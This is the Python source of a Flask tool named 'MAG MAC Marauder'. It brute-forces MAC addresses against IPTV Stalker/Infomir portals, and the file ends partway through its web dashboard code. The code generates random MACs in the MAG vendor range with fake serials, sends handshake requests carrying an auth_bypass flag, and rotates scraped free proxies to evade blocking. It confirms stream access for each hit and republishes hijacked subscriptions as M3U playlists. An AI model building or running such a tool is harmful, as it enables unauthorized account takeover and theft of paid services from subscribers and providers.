import os
import requests
import random
import threading
import time
import logging
import json
import re
from urllib.parse import urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from gevent import monkey; monkey.patch_all() # GEVENT MONKEY PATCH (MUST BE FIRST)

from flask import Flask, render_template, request, jsonify, Response, abort, redirect

# ============================================
# LOGGING & APP SETUP
# ============================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
app = Flask(__name__, template_folder='templates')

# ============================================
# CONFIGURATION
# ============================================
MAX_WORKERS = 50
EXECUTOR = ThreadPoolExecutor(max_workers=MAX_WORKERS)
FAST_TIMEOUT = 3
HEAVY_TIMEOUT = 10

# --- Proxy Management ---
PROXY_LIST = []  # Populated at runtime by the proxy manager
proxy_index = 0
proxy_lock = threading.Lock()

# --- Headers and Agents ---
STB_USER_AGENTS = [
    "Mozilla/5.0 (QtEmbedded; MAG254 stb) WebKit", "MAG250",
    "AuraHD", "Mozilla/5.0 (QtEmbedded; Stb-platform; Opera/12.16) WebKit/534.46", "MAG254",
]
STB_COOKIES = {"stb_lang": "en"}

# ============================================
# GLOBAL STATE & THREAD SAFETY
# ============================================
scan_state = {
    "running": False, "target_url": None, "attempts": 0,
    "found_macs": [], "logs": [], "thread": None
}
# mac_channel_cache: Stores full details (token, channels, **proxy**) for download/proxy activation.
mac_channel_cache = {}
state_lock = threading.Lock()

proxy_state = {
    "mac": None, "portal": None, "token": None, "user_agent": None,
    "last_token_time": 0, "channels": [], "last_channels_fetch": 0,
    "session": requests.Session(), "proxy": None
}
PROXY_SESSION_LIFETIME = 3000
PROXY_CHANNELS_REFRESH = 1800
proxy_thread = None

# ============================================
# PROXY SCRAPER AND TESTER LOGIC
# ============================================

def scrape_free_proxies():
    """Scrapes IP:PORT pairs from free-proxy-list.net."""
    url = "https://free-proxy-list.net/"
    headers = {'User-Agent': random.choice(STB_USER_AGENTS)}
    raw_proxies = []

    try:
        logging.info("Scraping proxy list...")
        response = requests.get(url, headers=headers, timeout=20)
        response.raise_for_status()

        soup = BeautifulSoup(response.content, 'lxml')
        table = soup.find('table', {'id': 'proxylisttable'})
        if not table:
            logging.error("Could not find proxy list table.")
            return []

        for row in table.find('tbody').find_all('tr'):
            columns = row.find_all('td')
            if len(columns) > 7:
                ip = columns[0].text
                port = columns[1].text
                if columns[6].text == 'yes':
                    raw_proxies.append(f"https://{ip}:{port}")

        logging.info(f"Scraped {len(raw_proxies)} potential HTTPS proxies.")
        return raw_proxies

    except requests.RequestException as e:
        logging.error(f"Failed to scrape proxies from {url}: {e}")
        return []
    except Exception as e:
        logging.error(f"Error during proxy scraping: {e}")
        return []

def test_proxy(proxy_url, test_url="https://www.google.com/"):
    """Tests a single proxy's connectivity and speed."""
    proxies = {"http": proxy_url, "https": proxy_url}

    try:
        start_time = time.time()
        headers = {'User-Agent': 'Mozilla/5.0'}

        r = requests.get(test_url, proxies=proxies, headers=headers, timeout=FAST_TIMEOUT)

        if r.status_code == 200:
            latency = time.time() - start_time
            return proxy_url, latency

    except requests.exceptions.RequestException:
        pass

    return None, None

def get_working_proxies(max_proxies=50, proxy_timeout=2.0):
    """Main function to scrape, test concurrently, and return working proxies."""
    raw_proxies = scrape_free_proxies()
    if not raw_proxies:
        return []

    logging.info(f"Testing {len(raw_proxies)} proxies concurrently (Timeout: {proxy_timeout}s)...")

    futures = [EXECUTOR.submit(test_proxy, p, "https://www.google.com/") for p in raw_proxies]

    working_list = []
    for future in as_completed(futures):
        proxy_url, latency = future.result()
        if proxy_url:
            working_list.append((proxy_url, latency))

    working_list.sort(key=lambda x: x[1])
    final_proxies = [url for url, latency in working_list[:max_proxies]]

    logging.info(f"Found {len(final_proxies)} working proxies after validation.")
    return final_proxies

# ============================================
# UTILITIES & HELPERS
# ============================================

def clean_url(url):
    """Ensure URL has proper scheme and no trailing slash."""
    parsed = urlparse(url)
    if not parsed.scheme:
        # User confirmed the need for http:// scheme when missing
        parsed = parsed._replace(scheme="http")

    # Reconstruct the URL using the scheme and the netloc (which includes the port)
    # The path is removed to get the base portal address.
    return parsed.scheme + "://" + parsed.netloc.rstrip('/')

def generate_mac():
    """Generate MAC in valid MAG vendor range and return SN/DevID1 for Enhanced Auth."""
    mac_bytes = [random.randint(0,255) for _ in range(3)]
    mac_end = f"{mac_bytes[0]:02X}:{mac_bytes[1]:02X}:{mac_bytes[2]:02X}"
    mac = f"00:1A:79:{mac_end}"

    sn_suffix = f"{mac_bytes[0]:02X}{mac_bytes[1]:02X}{mac_bytes[2]:02X}"
    sn = f"1610425{sn_suffix}"
    devid1 = f"{random.randint(100000, 999999)}{random.randint(1000, 9999)}"

    return mac, sn, devid1

def get_next_proxy():
    """Cycles through the PROXY_LIST in a thread-safe manner. Returns proxy dict and raw url."""
    global proxy_index
    with proxy_lock:
        if not PROXY_LIST:
            # Return None for both if list is empty
            return None, None

        proxy_url = PROXY_LIST[proxy_index % len(PROXY_LIST)]
        proxy_index += 1
        return {"http": proxy_url, "https": proxy_url}, proxy_url

def get_display_proxy(proxy_url):
    """Cleans up the proxy URL for display in the logs/UI."""
    if not proxy_url:
        return 'N/A'
    # Use urlparse to isolate host:port
    parsed = urlparse(proxy_url)
    return f"{parsed.hostname}:{parsed.port}" if parsed.hostname else proxy_url.split('@')[-1]


def check_portal_candidate(url):
    """Checks if a single URL is reachable with STB headers and returns the cleaned URL."""
    cleaned_url = clean_url(url)
    proxies, _ = get_next_proxy()
    try:
        r = requests.get(cleaned_url, headers={"User-Agent": STB_USER_AGENTS[0]}, timeout=FAST_TIMEOUT, proxies=proxies)
        if r.status_code < 400 or r.is_redirect:
            return cleaned_url
    except requests.exceptions.RequestException:
        pass
    return None

# ============================================
# CORE SCANNER LOGIC
# ============================================

def test_mac(portal_url, mac, sn, devid1):
    """Tests Handshake + Profile with Enhanced Auth and rotating proxy."""
    final_token, final_expires, final_ua = None, None, None

    # Get the proxy configuration and the raw URL string
    proxies, proxy_url = get_next_proxy()

    for ua in STB_USER_AGENTS:
        session = requests.Session()
        session.headers.update({"User-Agent": ua})
        session.cookies.update(STB_COOKIES)
        session.cookies.set("mac", mac)

        base_url = f"{portal_url}/server/load.php?type=stb"

        # 1. Handshake Request (INCLUDING SN and DevID1)
        handshake_url = (
            f"{base_url}&action=handshake&sn={sn}&device_id={devid1}"
            f"&hd=1&auth_bypass=1&ver=Infomir_API"
        )

        try:
            res = session.get(handshake_url, timeout=FAST_TIMEOUT, proxies=proxies)
            res.raise_for_status()

            js = res.json().get("js", {})
            token = js.get("token")
            expires = js.get("expires") or js.get("valid_through")

            if token and len(token) >= 5:
                final_token, final_expires, final_ua = token, expires, ua
                break

        except (requests.exceptions.RequestException, ValueError, KeyError):
            continue

    if not final_token:
        # Return the proxy_url used even on failure for logging/tracking
        return False, None, None, None, proxy_url

    # 2. Profile Retrieval (Uses the same session/token/proxy)
    try:
        profile_url = (
            f"{base_url}&action=get_profile&sn={sn}&device_id={devid1}"
        )
        session.headers.update({"Authorization": f"Bearer {final_token}"})

        pr = session.get(profile_url, timeout=FAST_TIMEOUT, proxies=proxies)
        pr.raise_for_status()

        profile = pr.json().get("js", {})
        if not any(k in profile for k in ["status", "phone", "connected", "packages", "allowed_stb"]):
            return False, None, None, None, proxy_url

        # SUCCESS
        return True, final_token, final_expires, final_ua, proxy_url

    except Exception:
        return False, None, None, None, proxy_url

def fetch_channels(portal_url, mac, token, user_agent, current_proxy):
    """Fetches ALL channels (heavy request) using the assigned proxy."""
    headers = {"user-agent": user_agent, "Authorization": f"Bearer {token}"}
    cookies = {"mac": mac, "stb_lang": "en"}
    url = f"{portal_url}/server/load.php?type=itv&action=get_all_channels"

    proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None

    try:
        r = requests.get(url, headers=headers, cookies=cookies, timeout=HEAVY_TIMEOUT, proxies=proxies)
        r.raise_for_status()

        raw = r.json().get("js", {}).get("data", [])
        cleaned = []
        for ch in raw:
            cmd = ch.get("cmd", "")
            if not cmd: continue
            stream = cmd.split("ffmpeg ", 1)[1].strip() if "ffmpeg " in cmd else cmd.strip()
            if not stream or not any(proto in stream for proto in ["http", "rtmp", "udp", "rtsp"]):
                continue
            cleaned.append({
                "id": str(ch.get("id", "")), "name": ch.get("name", ""),
                "cmd": cmd, "url": stream
            })
        return cleaned

    except Exception:
        return []

def test_stream_auth(portal_url, mac, token, user_agent, channel_cmd, current_proxy):
    """Tests stream authorization using the assigned proxy."""
    session = requests.Session()
    session.headers.update({
        "User-Agent": user_agent, "Authorization": f"Bearer {token}", "Referer": portal_url + "/"
    })
    session.cookies.set("mac", mac)
    session.cookies.set("stb_lang", "en")

    proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None

    cmd_clean = channel_cmd.replace('ffmpeg ', '').replace('auto ', '').strip()

    url = f"{portal_url}/server/load.php"
    params = {
        "type": "itv", "action": "create_link",
        "cmd": cmd_clean, "JsHttpRequest": "1-xml"
    }

    try:
        r = session.get(url, params=params, timeout=FAST_TIMEOUT, proxies=proxies)
        r.raise_for_status()

        js = r.json().get("js", {})
        stream_url = js.get("cmd") or js.get("url")

        if stream_url and any(proto in stream_url for proto in ["http", "rtmp", "udp", "rtsp"]):
            return True
        return False

    except requests.exceptions.RequestException:
        return False


# ============================================
# SCAN WORKER THREAD
# ============================================
def scan_worker():
    while True:
        with state_lock:
            if not scan_state["running"]:
                break
            portal = scan_state["target_url"]
            scan_state["attempts"] += 1
            attempt = scan_state["attempts"]

        mac, sn, devid1 = generate_mac()

        # STAGE 1: Test Login/Profile (Gets proxy URL if successful)
        valid, token, exp, ua, proxy_url = test_mac(portal, mac, sn, devid1)
        proxy_display = get_display_proxy(proxy_url)

        with state_lock:
            if not valid:
                scan_state["logs"].append(f"attempt #{attempt}: testing {mac} (via {proxy_display}) ... fail (Stage 1)")
                continue

            # STAGE 2 & 3: Channel Fetch & Stream Auth (Uses assigned proxy)
            channels = fetch_channels(portal, mac, token, ua, proxy_url)

            if len(channels) == 0:
                scan_state["logs"].append(f"attempt #{attempt}: {mac} VALID login but 0 channels returned (via {proxy_display}) → rejected (Stage 2)")
                continue

            first_channel_cmd = channels[0]["cmd"]
            stream_auth_ok = test_stream_auth(portal, mac, token, ua, first_channel_cmd, proxy_url)

            if not stream_auth_ok:
                scan_state["logs"].append(f"attempt #{attempt}: {mac} VALID login/channels, but FAILED stream auth (via {proxy_display}) → rejected (Stage 3)")
                continue

            # SUCCESS
            display = f"{portal} {mac} (Proxy: {proxy_display}) - {len(channels)} channels"

            if mac not in mac_channel_cache:
                scan_state["found_macs"].append(display)
                # Store the full, detailed cache entry including the raw proxy URL
                mac_channel_cache[mac] = {
                    "mac": mac, "portal": portal, "token": token, "user_agent": ua,
                    "expires": exp, "channels": channels, "proxy": proxy_url
                }

            scan_state["logs"].append(f"attempt #{attempt}: {mac} ... FULL SUCCESS! ({len(channels)} channels via {proxy_display})")

            if len(scan_state['logs']) > 200:
                scan_state['logs'].pop(0)

# ============================================
# PROXY MODE FUNCTIONS (for streaming)
# ============================================

def proxy_get_token():
    """Refreshes the token for the single active proxy MAC."""
    global proxy_state
    now = time.time()
    if proxy_state["token"] and now - proxy_state["last_token_time"] < PROXY_SESSION_LIFETIME:
        return proxy_state["token"]

    portal, mac, ua = proxy_state["portal"], proxy_state["mac"], proxy_state["user_agent"]
    current_proxy = proxy_state["proxy"]
    proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None

    proxy_state["session"].headers.update({"User-Agent": ua, "Referer": portal + "/"})
    proxy_state["session"].cookies.set("mac", mac)
    proxy_state["session"].cookies.set("stb_lang", "en")

    mac_bytes = [int(p, 16) for p in mac.split(':')[-3:]]
    sn_suffix = f"{mac_bytes[0]:02X}{mac_bytes[1]:02X}{mac_bytes[2]:02X}"
    sn = f"1610425{sn_suffix}"
    devid1 = f"{random.randint(100000, 999999)}{random.randint(1000, 9999)}"

    handshake_url = (
        f"{portal}/server/load.php?type=stb&action=handshake"
        f"&sn={sn}&device_id={devid1}&hd=1&auth_bypass=1&ver=Infomir_API"
    )

    try:
        r = proxy_state["session"].get(handshake_url, timeout=10, proxies=proxies)
        r.raise_for_status()
        js = r.json().get("js", {})
        token = js.get("token")

        if not token:
            return None

        proxy_state["token"] = token
        proxy_state["last_token_time"] = now
        proxy_state["session"].headers.update({"Authorization": f"Bearer {token}"})
        logging.info(f"[PROXY] Token refreshed successfully.")
        return token
    except Exception as e:
        logging.error(f"[PROXY ERROR] Token refresh failed: {e}")
        return None

def proxy_fetch_channels_worker():
    """Background thread to periodically fetch all channels."""
    global proxy_state
    while proxy_state["mac"]:
        token = proxy_get_token()
        if not token:
            time.sleep(60)
            continue

        current_proxy = proxy_state["proxy"]
        proxies = {"http": current_proxy, "https": current_proxy} if current_proxy else None

        url = f"{proxy_state['portal']}/server/load.php?type=itv&action=get_all_channels"

        try:
            r = proxy_state["session"].get(url, timeout=30, proxies=proxies)
            r.raise_for_status()

            data = r.json().get("js", {}).get("data", [])
            channels = []
            for ch in data:
                cmd = ch.get("cmd", "")
                if not cmd: continue
                stream = cmd.split("ffmpeg ", 1)[1].strip() if "ffmpeg " in cmd else cmd.strip()

                if not stream or not any(proto in stream for proto in ["http", "rtmp", "udp", "rtsp"]):
                    continue

                channels.append({
                    "id": str(ch["id"]), "name": ch.get("name", "").strip(), "url": stream, "cmd": cmd
                })

            proxy_state["channels"] = channels
            proxy_state["last_channels_fetch"] = time.time()
            logging.info(f"[PROXY] Loaded {len(channels)} channels.")

        except Exception as e:
            logging.error(f"[PROXY ERROR] Cannot load channels: {e}")

        time.sleep(PROXY_CHANNELS_REFRESH)

# ============================================
# FLASK ROUTES
# ============================================
@app.after_request
def after_request(response):
    response.headers.add("Access-Control-Allow-Origin", "*")
    response.headers.add("Access-Control-Allow-Headers", "Content-Type")
    response.headers.add("Access-Control-Allow-Methods", "GET")
    return response

@app.route("/")
def index():
    # Load the user-provided HTML directly
    html_content = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MAG MAC Marauder</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background-color: #0d1117;
        }
        .log-line {
            line-height: 1.25;
            padding: 2px 0;
            font-size: 0.8rem;
        }
        /* Custom scrollbar for logs */
        .log-box::-webkit-scrollbar { width: 8px; }
        .log-box::-webkit-scrollbar-thumb { background: #374151; border-radius: 4px; }
        .log-box::-webkit-scrollbar-track { background: #1f2937; }
        .success-mac {
            animation: pulse-green 1.5s infinite;
        }
        @keyframes pulse-green {
            0%, 100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.4); }
            50% { box-shadow: 0 0 10px 5px rgba(16, 185, 129, 0.8); }
        }
    </style>
</head>
<body class="min-h-screen p-4 sm:p-8 text-gray-100">

    <div class="max-w-7xl mx-auto">
        <header class="text-center mb-10">
            <h1 class="text-4xl font-extrabold text-teal-400">MAG MAC Marauder</h1>
            <p class="text-gray-400 mt-2">High-speed MAC Address Scanner & Proxy for MAG/Infomir Portals.</p>
        </header>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">

            <div class="lg:col-span-1 space-y-6">

                <div class="bg-gray-800 p-5 rounded-xl shadow-lg border border-gray-700">
                    <h2 class="text-xl font-semibold mb-3 text-teal-300">Target Portal</h2>
                    <div class="flex flex-col space-y-4">
                        <input type="url" id="portalUrl" placeholder="Enter Portal URL (e.g., http://example.com/c)"
                               class="bg-gray-700 text-white p-3 rounded-lg border border-gray-600 focus:ring-teal-500 focus:border-teal-500">

                        <div class="flex space-x-2">
                            <button id="startScanBtn" onclick="startScan()"
                                    class="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-lg transition duration-200 shadow-md shadow-green-900/50">
                                <span id="startScanText">Start Scan</span>
                            </button>
                            <button id="stopScanBtn" onclick="stopScan()" disabled
                                    class="flex-1 bg-red-600 hover:bg-red-700 text-white font-bold py-3 rounded-lg transition duration-200 opacity-50 cursor-not-allowed shadow-md shadow-red-900/50">
                                Stop Scan
                            </button>
                        </div>
                    </div>
                </div>

                <div class="bg-gray-800 p-5 rounded-xl shadow-lg border border-gray-700">
                    <h2 class="text-xl font-semibold mb-3 text-teal-300">URL Hunter (via urlscan.io)</h2>
                    <p class="text-gray-400 text-sm mb-4">Finds potential working portals for scanning.</p>
                    <button id="fetchUrlsBtn" onclick="fetchUrls()"
                            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg transition duration-200 shadow-md shadow-blue-900/50">
                        Fetch & Verify Portals
                    </button>
                    <div id="urlList" class="mt-4 max-h-48 overflow-y-auto log-box space-y-1">
                        <p class="text-gray-500 text-xs">No URLs fetched yet.</p>
                    </div>
                </div>

                <div class="bg-gray-800 p-5 rounded-xl shadow-lg border border-gray-700">
                    <h2 class="text-xl font-semibold mb-3 text-teal-300">Active Proxy</h2>
                    <p id="proxyStatus" class="text-sm text-yellow-400 mb-2">Proxy is inactive.</p>
                    <div id="proxyDetails" class="space-y-2 text-sm text-gray-300 hidden">
                        <p>MAC: <code id="proxyMac" class="font-mono text-teal-400"></code></p>
                        <p>Portal: <code id="proxyPortal" class="font-mono text-teal-400"></code></p>
                        <p>Channels: <span id="proxyChannelCount">0</span></p>
                        <a id="playlistLink" href="#" target="_blank" class="text-blue-400 hover:text-blue-300 underline block mt-2">Download M3U Playlist</a>
                        <p class="text-gray-500 text-xs mt-1">Use this M3U link in VLC or Kodi.</p>
                    </div>
                </div>
            </div>

            <div class="lg:col-span-2 space-y-6">

                <div class="bg-gray-800 p-5 rounded-xl shadow-lg border border-gray-700">
                    <h2 class="text-xl font-semibold mb-3 text-teal-300 flex justify-between items-center">
                        Working MACs Found (<span id="macCount">0</span>)
                        <button onclick="downloadResults()" class="text-sm bg-gray-600 hover:bg-gray-500 text-white px-3 py-1 rounded-lg transition duration-150">
                            Save All Results (.json)
                        </button>
                    </h2>
                    <div id="resultsList" class="max-h-96 overflow-y-auto log-box space-y-2">
                        <p class="text-gray-500 text-sm">No MACs found yet. Start scanning a portal.</p>
                    </div>
                </div>

                <div class="bg-gray-800 p-5 rounded-xl shadow-lg border border-gray-700">
                    <h2 class="text-xl font-semibold mb-3 text-teal-300">Scan Activity Log</h2>
                    <p class="text-gray-500 text-sm mb-2">Attempts: <span id="attemptCount">0</span></p>
                    <div id="logBox" class="log-box h-48 bg-gray-900 p-3 rounded-lg overflow-y-auto text-gray-400 font-mono">
                        <p class="log-line">--- Ready to scan. Enter a portal URL to begin. ---</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="messageModal" class="fixed inset-0 bg-gray-900 bg-opacity-75 hidden items-center justify-center p-4 z-50">
        <div class="bg-gray-800 p-6 rounded-xl shadow-2xl max-w-sm w-full border border-teal-500">
            <h3 id="modalTitle" class="text-xl font-bold mb-3 text-teal-400">Alert</h3>
            <p id="modalMessage" class="text-gray-300 mb-6"></p>
            <button onclick="closeModal()" class="w-full bg-teal-600 hover:bg-teal-700 text-white font-bold py-2 rounded-lg transition duration-200">
                OK
            </button>
        </div>
    </div>

    <script>
        const PORTAL_URL_INPUT = document.getElementById('portalUrl');
        const START_SCAN_BTN = document.getElementById('startScanBtn');
        const STOP_SCAN_BTN = document.getElementById('stopScanBtn');
        const START_SCAN_TEXT = document.getElementById('startScanText');
        const LOG_BOX = document.getElementById('logBox');
        const RESULTS_LIST = document.getElementById('resultsList');
        const MAC_COUNT = document.getElementById('macCount');
        const ATTEMPT_COUNT = document.getElementById('attemptCount');
        const URL_LIST = document.getElementById('urlList');

        const PROXY_STATUS = document.getElementById('proxyStatus');
        const PROXY_DETAILS = document.getElementById('proxyDetails');
        const PROXY_MAC = document.getElementById('proxyMac');
        const PROXY_PORTAL = document.getElementById('proxyPortal');
        const PROXY_CHANNEL_COUNT = document.getElementById('proxyChannelCount');
        const PLAYLIST_LINK = document.getElementById('playlistLink');

        let scanInterval = null;
        let fullMacCache = {}; // Local cache for download/proxy activation

        // --- Utility Functions ---

        function showMessage(title, message) {
            document.getElementById('modalTitle').textContent = title;
            document.getElementById('modalMessage').textContent = message;
            document.getElementById('messageModal').classList.remove('hidden');
            document.getElementById('messageModal').classList.add('flex');
        }

        function closeModal() {
            document.getElementById('messageModal').classList.add('hidden');
            document.getElementById('messageModal').classList.remove('flex');
        }

        function log(message, type = 'default') {
            const line = document.createElement('p');
            line.className = 'log-line';
            if (type === 'success') {
                line.classList.add('text-green-400', 'font-bold');
            } else if (type === 'fail' || type === 'error') {
                line.classList.add('text-red-400');
            } else if (type === 'info') {
                line.classList.add('text-blue-400');
            } else {
                line.classList.add('text-gray-400');
            }
            line.textContent = message;

            // Add to top of log list
            if (LOG_BOX.firstChild) {
                LOG_BOX.insertBefore(line, LOG_BOX.firstChild);
            } else {
                LOG_BOX.appendChild(line);
            }

            // Keep log size manageable (e.g., last 200 lines)
            while (LOG_BOX.childElementCount > 200) {
                LOG_BOX.removeChild(LOG_BOX.lastChild);
            }
        }

        // --- API Functions ---

        async function startScan() {
            const portalUrl = PORTAL_URL_INPUT.value.trim();
            if (!portalUrl) {
                showMessage("Error", "Please enter a portal URL to begin scanning.");
                return;
            }

            try {
                const response = await fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `portal_url=${encodeURIComponent(portalUrl)}`
                });

                const result = await response.json();

                if (response.ok) {
                    log(`Scan initiated on ${portalUrl}.`, 'info');
                    setScanningState(true);
                    startStatusPolling();
                } else {
                    showMessage("Error", result.error || "Failed to start scan.");
                    log(`Failed to start scan: ${result.error}`, 'error');
                }
            } catch (error) {
                showMessage("Network Error", "Could not connect to the backend server.");
                log(`Network error starting scan: ${error}`, 'error');
            }
        }

        async function stopScan() {
            try {
                const response = await fetch('/stop', { method: 'POST' });
                const result = await response.json();

                if (response.ok) {
                    log("Scan stopped successfully.", 'info');
                    setScanningState(false);
                    stopStatusPolling();
                } else {
                    showMessage("Error", result.status || "Failed to stop scan.");
                    log(`Failed to stop scan: ${result.status}`, 'error');
                }
            } catch (error) {
                showMessage("Network Error", "Could not connect to the backend server.");
                log(`Network error stopping scan: ${error}`, 'error');
            }
        }

        async function getStatus() {
            try {
                const response = await fetch('/status');
                const data = await response.json();

                updateUI(data);

                if (data.running) {
                    setScanningState(true);
                } else {
                    setScanningState(false);
                }

                if (!scanInterval) {
                     // If we fetched status and scan is still running but interval was cleared, restart it
                     if (data.running) {
                        startStatusPolling();
                     }
                }

            } catch (error) {
                // If status fails, assume disconnection
                log("Lost connection to the backend server. Stopping polling.", 'error');
                setScanningState(false);
                stopStatusPolling();
            }
        }

        async function startProxy(mac) {
            try {
                const response = await fetch(`/proxy/start/${mac}`);
                const result = await response.json();

                if (response.ok) {
                    log(`Proxy activated for MAC: ${mac}`, 'success');
                    // Use the newly fetched channel count from the proxy_channels field
                    updateProxyUI(result.mac, result.portal, result.playlist_url, result.channels_count || fullMacCache[mac].channels.length);
                    // Refetch status to ensure all proxy details are synced
                    getStatus();
                } else {
                    showMessage("Proxy Error", result.error || "Failed to start proxy.");
                    log(`Failed to start proxy: ${result.error}`, 'error');
                }
            } catch (error) {
                showMessage("Network Error", "Could not communicate with proxy server.");
                log(`Network error starting proxy: ${error}`, 'error');
            }
        }
        window.startProxy = startProxy; // Expose to global scope for button click

        async function fetchUrls() {
            URL_LIST.innerHTML = '<p class="text-yellow-500 text-xs">Searching for portals... (This may take up to 20 seconds)</p>';
            document.getElementById('fetchUrlsBtn').disabled = true;
            document.getElementById('fetchUrlsBtn').textContent = 'Searching...';

            try {
                const response = await fetch('/fetch-urls');
                const urls = await response.json();

                document.getElementById('fetchUrlsBtn').disabled = false;
                document.getElementById('fetchUrlsBtn').textContent = 'Fetch & Verify Portals';

                if (urls.length === 0) {
                    URL_LIST.innerHTML = '<p class="text-red-400 text-sm">No live portals found matching the signature.</p>';
                    return;
                }

                URL_LIST.innerHTML = '';
                urls.forEach(url => {
                    const urlItem = document.createElement('div');
                    urlItem.className = 'flex justify-between items-center bg-gray-700/50 p-2 rounded-lg';
                    urlItem.innerHTML = `
                        <span class="text-xs truncate text-gray-300">${url}</span>
                        <button onclick="document.getElementById('portalUrl').value='${url}'; log('Portal URL set to ${url}', 'info');"
                                class="text-xs bg-teal-600 hover:bg-teal-500 px-2 py-1 rounded-md transition duration-150 ml-2">
                            Use
                        </button>
                    `;
                    URL_LIST.appendChild(urlItem);
                });
                log(`Found ${urls.length} live portal candidates.`, 'info');

            } catch (error) {
                document.getElementById('fetchUrlsBtn').disabled = false;
                document.getElementById('fetchUrlsBtn').textContent = 'Fetch & Verify Portals';
                URL_LIST.innerHTML = '<p class="text-red-400 text-sm">Failed to fetch URLs. Check console for details.</p>';
                log(`Error fetching URLs: ${error}`, 'error');
            }
        }


        // --- UI Update & State Management ---

        function setScanningState(running) {
            PORTAL_URL_INPUT.disabled = running;
            START_SCAN_BTN.disabled = running;
            STOP_SCAN_BTN.disabled = !running;

            if (running) {
                START_SCAN_TEXT.textContent = 'Scanning...';
                START_SCAN_BTN.classList.remove('bg-green-600', 'hover:bg-green-700');
                START_SCAN_BTN.classList.add('bg-green-800', 'opacity-70', 'cursor-not-allowed');
                STOP_SCAN_BTN.classList.remove('opacity-50', 'cursor-not-allowed');
            } else {
                START_SCAN_TEXT.textContent = 'Start Scan';
                START_SCAN_BTN.classList.remove('bg-green-800', 'opacity-70', 'cursor-not-allowed');
                START_SCAN_BTN.classList.add('bg-green-600', 'hover:bg-green-700');
                STOP_SCAN_BTN.classList.add('opacity-50', 'cursor-not-allowed');
            }
        }

        function startStatusPolling() {
            if (!scanInterval) {
                scanInterval = setInterval(getStatus, 1500); // Poll every 1.5 seconds
            }
        }

        function stopStatusPolling() {
            if (scanInterval) {
                clearInterval(scanInterval);
                scanInterval = null;
            }
        }

        function updateUI(data) {
            ATTEMPT_COUNT.textContent = data.attempts.toLocaleString();

            // Log updates (prevent adding duplicates)
            const currentLogs = Array.from(LOG_BOX.children).map(p => p.textContent.trim());
            data.logs.slice().reverse().forEach(logMessage => {
                if (!currentLogs.includes(logMessage)) {
                    // Check for success marker
                    const type = logMessage.includes('SUCCESS!') ? 'success' : 'default';
                    log(logMessage, type);
                }
            });

            // Results updates
            const existingMacs = new Set(Array.from(RESULTS_LIST.children).map(div => div.dataset.mac));

            // --- CRITICAL UPDATE: Store the full_cache sent by the backend ---
            fullMacCache = data.full_cache;

            data.found.forEach(item => {
                if (!existingMacs.has(item.mac)) {
                    const resultItem = document.createElement('div');
                    resultItem.dataset.mac = item.mac;
                    resultItem.className = 'success-mac bg-gray-700 p-3 rounded-lg flex flex-col sm:flex-row justify-between items-start sm:items-center transition duration-300';
                    resultItem.innerHTML = `
                        <div class="truncate mr-4 flex-1">
                            <code class="font-mono text-lg text-green-400 block sm:inline">${item.mac}</code>
                            <p class="text-sm text-gray-400 truncate">
                                ${item.portal} | ${item.working_channels_count} Ch | Expires: ${item.expires}
                                <span class="text-teal-300"> (Proxy: ${item.proxy_used}) </span> </p>
                        </div>
                        <button onclick="startProxy('${item.mac}')"
                                class="mt-2 sm:mt-0 bg-yellow-600 hover:bg-yellow-700 text-white text-sm font-semibold py-1 px-3 rounded-md transition duration-150 shadow-md">
                            Activate Proxy
                        </button>
                    `;
                    RESULTS_LIST.prepend(resultItem); // Prepend so new items are at the top
                }
            });

            if (data.found.length > 0) {
                // Remove placeholder if results exist
                const placeholder = RESULTS_LIST.querySelector('p.text-gray-500');
                if (placeholder) placeholder.remove();
            }

            MAC_COUNT.textContent = data.found.length.toLocaleString();

            // Proxy UI update
            if (data.proxy_mac) {
                updateProxyUI(data.proxy_mac, data.proxy_portal, `/proxy/playlist.m3u`, data.proxy_channels);
            } else {
                PROXY_STATUS.textContent = "Proxy is inactive.";
                PROXY_STATUS.classList.remove('text-green-400');
                PROXY_STATUS.classList.add('text-yellow-400');
                PROXY_DETAILS.classList.add('hidden');
            }
        }

        function updateProxyUI(mac, portal, playlistUrl, channelCount) {
            PROXY_STATUS.textContent = "Proxy Active";
            PROXY_STATUS.classList.remove('text-yellow-400');
            PROXY_STATUS.classList.add('text-green-400');
            PROXY_DETAILS.classList.remove('hidden');

            PROXY_MAC.textContent = mac;
            PROXY_PORTAL.textContent = portal;
            PROXY_CHANNEL_COUNT.textContent = channelCount;
            PLAYLIST_LINK.href = playlistUrl;
        }


        function downloadResults() {
            if (Object.keys(fullMacCache).length === 0) {
                showMessage("Download Failed", "No working MACs found in the cache to download.");
                return;
            }

            const downloadData = Object.values(fullMacCache).map(details => ({
                portal: details.portal,
                mac: details.mac,
                user_agent: details.user_agent,
                expires: details.expires,
                proxy_used: details.proxy, // Now includes the raw proxy URL for download
                working_channels: details.channels.length,
                // Only send necessary channel details for the download (excluding 'cmd' which is for internal use)
                channels: details.channels.map(ch => ({ id: ch.id, name: ch.name, url: ch.url }))
            }));

            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(downloadData, null, 4));
            const downloadAnchorNode = document.createElement('a');
            downloadAnchorNode.setAttribute("href", dataStr);
            downloadAnchorNode.setAttribute("download", `mag-mac-results-${new Date().toISOString().substring(0, 10)}.json`);
            document.body.appendChild(downloadAnchorNode);
            downloadAnchorNode.click();
            downloadAnchorNode.remove();

            log(`Successfully downloaded ${downloadData.length} results.`, 'info');
        }
        window.downloadResults = downloadResults;

        // --- Initialization ---
        window.onload = () => {
            // Check initial status on load to sync state (e.g., if server restarted)
            getStatus();
        };

    </script>
</body>
</html>"""
